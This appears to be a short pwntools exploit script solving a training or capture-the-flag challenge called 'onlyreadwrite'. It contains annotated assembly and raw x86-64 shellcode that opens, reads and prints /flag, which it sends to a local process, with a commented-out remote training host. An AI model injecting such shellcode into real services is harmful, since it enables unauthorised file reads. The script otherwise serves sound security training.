from pwn import *

asm_code = """
mov r9, rax
mov rdi, rax
xor rsi, rsi
xor rdx, rdx
mov rax, 2
add rdi, 43
syscall  --> to open the file flag
mov r9, rcx
mov rdi, rax  --> to move the fd created by open
add rdx, 50
xor rax, rax
mov rsi, rcx
add rsi, 100
syscall  --> to read the file flag storing the results in rsi+100 (the buffer created at the begin)
mov rdx, rax
mov rax, 1
mov rdi, 1
syscall + /flag  --> to write the flag on stdout

"""

context.arch = 'amd64'

shellcode = b"\x49\x89\xC1\x48\x89\xC7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x48\x83\xC7\x43\x0F\x05\x49\x89\xC9\x48\x89\xC7\x48\x83\xC2\x32\x48\x31\xC0\x48\x89\xCE\x48\x83\xC6\x64\x0F\x05\x48\x89\xC2\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x0F\x05/flag"
p = process("./onlyreadwrite")
"""gdb.attach(p, '''
    b *0x0401548
''')
input("wait")"""
#p = remote("bin.training.offdef.it", 2006)
p.send(shellcode)
p.interactive()